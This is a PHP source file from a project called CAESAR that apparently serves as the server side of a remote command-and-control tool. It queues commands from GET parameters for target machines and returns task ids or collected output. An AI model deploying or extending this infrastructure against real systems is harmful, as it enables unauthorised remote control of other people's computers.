<?php

	/*
		CAESAR

		Author : Michele '0blio' Cisternino
		Email  : miki.cisternino@gmail.com
		Github : https://github.com/0blio
	
		This project is released under the GPL 3 license. 	
	*/

	$command = trim($_GET['command']);
	$target = trim($_GET['target']);

	// If the script wants to check the output for a specific task
	if (startswith($command, 'check output')) {
		$arguments = get_arguments ('check output', $command);
		$task_id = $arguments[0];

		$result = $db -> table ('tasks') -> columns('executed') -> eq ('task_id', $task_id) -> findAll();
		$task_executed = $result[0]['executed'];

		// If the task specified by the task id has been already executed
		if ($task_executed) {
			// Take the output of that command
			$result = $db -> table ('tasks') -> columns('output') -> eq ('task_id', $task_id) -> findAll();
			$output = trim(htmlentities($result[0]['output']));
		} else {
			// Else the server will return the task id
			$output = $task_id;
		}
	
	// Else insert the task in the database
	} else {
		// Generating a task identifier
		do {
			$task_id = random_string (6);
		} while ($db -> table ('tasks') -> eq ('task_id', $task_id) -> exists()); 

		$datetime = date("Y-m-d H:i:s");

		if ($command == 'exit') {
			// Removing all the 'exit' requests
			$db -> table ('tasks') -> eq('user_id', $target) -> eq('command', 'connect') -> remove();

			// Removing all the 'connect' requests
			$db -> table ('tasks') -> eq('user_id', $target) -> eq('command', 'exit') -> remove();
			$output = 'exit';
		}

		// Inserting the task
		$db -> table ('tasks') -> insert (['user_id' => $target, 'task_id' => $task_id, 'command' => $command, 'insertion_time' => $datetime]);	
	
		if ($command != 'exit')
			// Return the id of the inserted task
			$output = $task_id;
	}
